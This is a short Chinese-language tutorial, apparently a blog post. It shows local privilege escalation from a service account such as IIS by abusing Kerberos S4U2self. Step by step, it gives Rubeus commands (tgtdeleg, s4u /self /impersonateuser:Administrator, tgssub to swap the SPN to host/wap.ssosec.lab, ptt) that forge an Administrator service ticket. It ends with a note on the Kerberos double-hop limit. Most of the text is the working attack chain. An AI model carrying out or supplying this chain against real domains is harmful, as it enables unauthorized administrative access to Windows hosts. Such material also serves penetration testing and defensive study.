S4u2self可以被用来进行本地提权，假如你拿到一个服务帐号如iis此类的账户，便可以完成此类攻击。因为所有具有spn的用户都可以请求S4U2self。

先利用tgtdeleg来获取该账户的TGT
Default
Rubeus.exe tgtdeleg /nowrap

然后利用s4u来颁发TGS
Default
Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /ticket:上一步获得的ticket

查看服务名可以看到服务名为我们的机器账户
Default
Rubeus.exe describe /ticket:前面获得的ticket

但其没有给我们办法SPN，但我们可以自行进行修改，利用tgssub
Default
Rubeus.exe tgssub /altservice:host/wap.ssosec.lab /ticket:doIFdD

然后我们只需要去ptt这个票据即可
Default
Rubeus.exe ptt /ticket:前面获得的ticket

然后访问主机的host服务（或者是http服务），已变成管理员权限但是本地管理员无法变为域管。
这是因为 Kerberos Double Hop的问题，在PSSession中，Powershell是通过委派用户凭证的方式让用户在远程计算机上执行任务的。用户从计算机A创建会话连接到计算机B，Powershell通过委派，使得计算机B以用户身份执行任务，好像就是用户自己在执行一样。此时，用户试图与其他计算机C建立连接，得到的却是红色的拒绝访问。因为此时并不是以该用户身份请求访问C，而是以计算机B账户请求的。而微软给出的解决方案则是无约束委派，没有意义，不做讨论。